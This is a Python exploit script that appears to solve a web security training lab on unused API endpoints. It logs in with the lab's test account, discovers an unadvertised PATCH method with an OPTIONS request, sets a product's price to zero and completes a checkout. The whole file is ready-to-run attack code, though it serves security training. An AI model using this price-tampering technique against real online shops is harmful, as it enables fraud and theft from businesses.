import sys
import requests
import urllib3
from bs4 import BeautifulSoup

# Disable insecure request warnings to prevent clutter in output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings (adjust if needed, typically used for interception tools like Burp Suite)
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Lab: Finding and exploiting an unused API endpoint
def login(session, target_host):
    """Logs into the target website and retrieves a CSRF token needed for authentication."""
    url = "https://" + target_host + "/login"
    
    # Get CSRF token from the login page
    csrf_response = session.get(url, verify=False)
     # Check if the host is responding
    if csrf_response.status_code == 504:
        print('(!) Host down .')
        sys.exit(-1)
    soup = BeautifulSoup(csrf_response.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})['value']
    
    # Login request using predefined credentials
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    login_response = session.post(url, data=data, verify=False, allow_redirects=False, proxies=proxy)
    
    # Check if login was successful (302 indicates redirection after login)
    if login_response.status_code == 302:
        print('(+) Successfully logged into the account.')
        return session
    else:
        print('(!) Error while trying to log in.')
        sys.exit()


def unused_api(session, target_host):
    """Checks for unused API methods and exploits the PATCH method if available."""
    url = "https://" + target_host + "/api/products/1/price"
    print('(+) Checking for allowed HTTP methods using OPTIONS request...')
    
    # Send OPTIONS request to discover available HTTP methods
    response = session.options(url, verify=False, proxies=proxy)
    allowed_methods = response.headers.get("Allow", "")
    print(f'(+) Methods found: {allowed_methods}')
    
    # Check if PATCH method is allowed
    if "PATCH" in allowed_methods:
        print('(+) PATCH method found. Exploiting to modify product price.')
        print('(+) Updating price to $0.00...')
        
        # Update product price to $0.00 using PATCH request
        data = {"price": 0}
        update_price_response = session.patch(url, json=data, verify=False, proxies=proxy)
        
        # Check if the price was successfully updated
        if "$0.00" in update_price_response.text:
            print('(+) Price updated successfully.')
            
            # Add the product to the shopping cart
            url_add_product = "https://" + target_host + "/cart"
            product_data = {"productId": "1", "redir": "PRODUCT", "quantity": "3"}
            response_add_product = session.post(url_add_product, data=product_data, verify=False, allow_redirects=False, proxies=proxy)
            print('(+) Adding product to the cart...')
            
            # Check if the product was successfully added
            if response_add_product.status_code == 302:
                print('(+) Product successfully added to the cart.')
                print('(+) Proceeding to checkout...')
                
                buy_url = "https://" + target_host + "/cart/checkout"
                
                # Extract CSRF token for checkout
                csrf_response = session.get(url_add_product, verify=False, proxies=proxy)
                soup = BeautifulSoup(csrf_response.text, "html.parser")
                csrf = soup.find("input", {"name": "csrf"})['value']
                
                # Complete the purchase by submitting checkout request
                buy_response = session.post(buy_url, verify=False, data={"csrf": csrf}, allow_redirects=True, proxies=proxy)
                
                # Verify if the lab was successfully solved
                if "Congratulations" in buy_response.text:
                    print('(+) Congratulations, you solved the lab!')
                else:
                    print('(!) Error: Lab not solved.')
                    sys.exit()
            else:
                print('(!) Error: Failed to add product to the cart.')
                sys.exit()
        else:
            print('(!) Error: Failed to update product price.')
            sys.exit()
    else:
        print('(!) Error: PATCH method not found.')
        sys.exit()


def main():
    """Main function to run the exploit. It requires a target URL as an argument."""
    if len(sys.argv) != 2:
        print(f'(!) Usage: {sys.argv[0]} <url>')
        print(f'(!) Example: {sys.argv[0]} xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net')
        sys.exit()
    
    # Create a session to maintain authentication and cookies
    session = requests.session()
    target_host = sys.argv[1]
    
    # Perform login and execute the exploit
    session = login(session, target_host)
    unused_api(session, target_host)


if __name__ == "__main__":
    main()
